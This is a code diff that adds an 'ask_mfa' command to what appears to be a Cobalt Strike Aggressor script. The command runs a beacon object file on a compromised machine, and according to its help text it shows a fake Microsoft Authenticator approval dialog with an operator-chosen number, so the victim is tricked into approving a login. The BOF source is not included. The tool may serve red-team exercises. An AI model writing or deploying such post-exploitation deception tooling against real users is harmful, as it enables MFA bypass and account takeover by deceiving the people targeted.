@@ -2194,3 +2194,29 @@ Example:
 
 "
 );
+
+alias ask_mfa {
+	local('$mfa_number $args');
+	if(size(@_) != 2)
+	{
+		berror($1, "usage: ask_mfa <mfa_number>");
+		return;
+	}
+	$mfa_number = parseNumber($2, 10);
+	
+	# Validate MFA number range (typically 0-99 for 2-digit codes)
+	if($mfa_number < 0 || $mfa_number > 99)
+	{
+		berror($1, "MFA number should be between 0-99");
+		return;
+	}
+	
+	$args = bof_pack($1, "i", $mfa_number);
+	beacon_inline_execute($1, readbof($1, "ask_mfa"), "go", $args);
+}
+
+beacon_command_register(
+	"ask_mfa",
+	"Displays a fake Microsoft MFA approval dialog",
+	"Command: ask_mfa\n\nUsage: ask_mfa <number>\n\nDisplays a fake Microsoft Authenticator approval dialog with the specified number.\nThe dialog auto-closes after 30 seconds or when the user closes it.\n\nExample: ask_mfa 42"
+);
